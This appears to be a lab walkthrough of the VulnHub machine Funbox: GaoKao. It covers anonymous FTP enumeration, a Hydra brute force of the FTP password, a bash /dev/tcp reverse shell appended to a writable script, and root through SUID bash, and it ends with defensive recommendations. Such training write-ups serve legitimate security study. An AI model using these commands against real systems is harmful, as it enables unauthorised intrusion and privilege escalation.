# Funbox: GaoKao (VulnHub)

## Overview

**Funbox: GaoKao** is an Easy-level VulnHub machine focused on FTP security weaknesses, password attacks, reverse shell exploitation, and Linux privilege escalation. The machine demonstrates how multiple common misconfigurations—including anonymous FTP access, weak credentials, writable scripts, and dangerous SUID permissions—can be chained together to achieve complete system compromise.

This lab provides hands-on experience with reconnaissance, FTP enumeration, credential brute-forcing, remote code execution, shell stabilization, and privilege escalation.

---

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Funbox: GaoKao |
| Platform | VulnHub |
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Attacker Machine | Kali Linux |
| Main Vector | Anonymous FTP → Weak Credentials → Writable Script → SUID Bash |
| Objective | Gain Root Access and Retrieve the Root Flag |

---

## Skills Demonstrated

- Network Discovery
- Host Enumeration
- Service Enumeration
- Nmap Scanning
- FTP Enumeration
- Anonymous FTP Access
- Banner Grabbing
- Username Enumeration
- Password Brute Force
- Hydra
- Reverse Shell Injection
- Netcat Listener
- Shell Stabilization
- Python PTY
- Linux Enumeration
- SUID Enumeration
- Privilege Escalation
- Post Exploitation

---

## Tools Used

- Netdiscover
- Nmap
- FTP
- Hydra
- Netcat
- Python
- Bash
- Linux Commands
- Kali Linux

---

## Attack Methodology

1. Discover the target machine.
2. Enumerate open services.
3. Identify anonymous FTP access.
4. Leak a valid username from the FTP banner.
5. Download FTP files.
6. Brute-force FTP credentials.
7. Authenticate to FTP.
8. Download and modify the writable script.
9. Inject a reverse shell payload.
10. Upload the modified script.
11. Catch the reverse shell.
12. Upgrade to an interactive TTY.
13. Enumerate SUID binaries.
14. Exploit SUID Bash.
15. Obtain root access.
16. Capture the root flag.

---

## Network Discovery

Identify the target machine.

```bash
sudo netdiscover -i eth0
```

Result:

```text
192.168.10.10
```

The vulnerable machine was successfully identified on the local network.

---

## Service Enumeration

Perform a service and version scan.

```bash
sudo nmap -sC -sV -Pn 192.168.10.10 --min-rate 10000
```

### Open Ports

| Port | Service | Version |
|------|----------|---------|
| 21 | FTP | ProFTPD 1.3.5e |
| 22 | SSH | OpenSSH 7.6p1 |
| 80 | HTTP | Apache 2.4.29 |
| 3306 | MySQL | MySQL 5.7.34 |

### Important Finding

```text
Anonymous FTP login allowed
```

---

## FTP Enumeration

Connect to the FTP service.

```bash
ftp 192.168.10.10
```

Authenticate anonymously.

```text
Username: anonymous
Password: anonymous
```

During login the FTP banner leaked a valid username.

```text
please report them via e-mail to <sky@funbox9>
```

Discovered username:

```text
sky
```

---

## Downloading FTP Files

List available files.

```bash
dir
```

Interesting file discovered:

```text
welcome.msg
```

Download it.

```bash
get welcome.msg
```

Read its contents.

```bash
cat welcome.msg
```

Output:

```text
please report them via e-mail to <sky@%L>.
```

The username **sky** was confirmed.

---

## Password Brute Force

Use Hydra against the FTP service.

```bash
hydra -l sky -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.10
```

Successful credentials:

```text
Username: sky
Password: thebest
```

---

## Authenticated FTP Access

Reconnect using the discovered credentials.

```bash
ftp 192.168.10.10
```

Authenticate.

```text
Username: sky
Password: thebest
```

List files.

```bash
ls
```

Interesting file:

```text
user.flag
```

Download it.

```bash
get user.flag
```

Read the file.

```bash
cat user.flag
```

Output:

```bash
#!/bin/sh
echo "Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd"
```

---

## Reverse Shell Injection

Modify the writable script.

```bash
nano user.flag
```

Append a Bash reverse shell.

```bash
#!/bin/sh
echo "Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd"
bash -i >& /dev/tcp/<YOUR-IP>/1234 0>&1
```

Upload it back.

```bash
put user.flag
```

Verify.

```bash
less user.flag
```

---

## Initial Access

Start a Netcat listener.

```bash
nc -lnvp 1234
```

Once the script executes, a reverse shell is received.

Example:

```text
connect to [192.168.10.13] from [192.168.10.10]
```

A shell is successfully established.

---

## Shell Stabilization

Upgrade the shell.

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

A fully interactive TTY shell is obtained.

---

## Privilege Escalation

Search for SUID binaries.

```bash
find / -perm -4000 2>/dev/null
```

Interesting finding:

```text
/bin/bash
```

Exploit it.

```bash
bash -p
```

Verify privileges.

```bash
id
```

Output:

```text
uid=1002(sarah)
gid=1002(sarah)
euid=0(root)
```

Check current user.

```bash
whoami
```

Output:

```text
root
```

Root access has been successfully obtained.

---

## Root Flag

Navigate to the root directory.

```bash
cd /root
```

Read the flag.

```bash
cat root.flag
```

Root flag successfully captured.

---

## Vulnerabilities Identified

### 1. Anonymous FTP Access

Anonymous authentication exposed internal files.

### 2. Username Disclosure

FTP banner leaked a valid system username.

### 3. Weak FTP Password

The account password was vulnerable to dictionary attacks.

### 4. Writable Executable Script

Attackers could modify executable scripts to gain code execution.

### 5. Reverse Shell Execution

Uploaded scripts allowed remote command execution.

### 6. Dangerous SUID Permissions

The SUID-enabled Bash binary allowed privilege escalation.

---

## Attack Chain Summary

- Network Discovery using Netdiscover
- Service Enumeration using Nmap
- Anonymous FTP Access
- Username Enumeration from FTP Banner
- Password Brute Force using Hydra
- Authenticated FTP Login
- Writable Script Discovery
- Reverse Shell Injection
- Netcat Listener
- Shell Stabilization
- SUID Enumeration
- Privilege Escalation using SUID Bash
- Root Access
- Root Flag Retrieval

---

## Security Recommendations

- Disable anonymous FTP access.
- Remove sensitive information from service banners.
- Enforce strong password policies.
- Enable account lockout after repeated failed logins.
- Restrict write permissions on executable files.
- Monitor FTP authentication attempts.
- Remove unnecessary SUID permissions.
- Apply the principle of least privilege.
- Perform regular vulnerability assessments.
- Continuously monitor critical services.

---

## Key Learning Outcomes

- FTP misconfigurations can expose sensitive information.
- Service banners may leak valuable reconnaissance data.
- Weak passwords remain one of the easiest attack vectors.
- Writable scripts can lead directly to remote code execution.
- Proper shell stabilization improves post-exploitation.
- SUID misconfigurations can result in full root compromise.
- Multiple low-risk issues can combine into complete system compromise.

---

## Conclusion

Funbox: GaoKao is an excellent beginner-friendly VulnHub machine demonstrating a realistic attack chain through FTP security weaknesses. It teaches network reconnaissance, FTP enumeration, password attacks, reverse shell execution, Linux post-exploitation, and privilege escalation using a misconfigured SUID Bash binary. The machine reinforces the importance of securing authentication mechanisms, file permissions, and privilege management.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
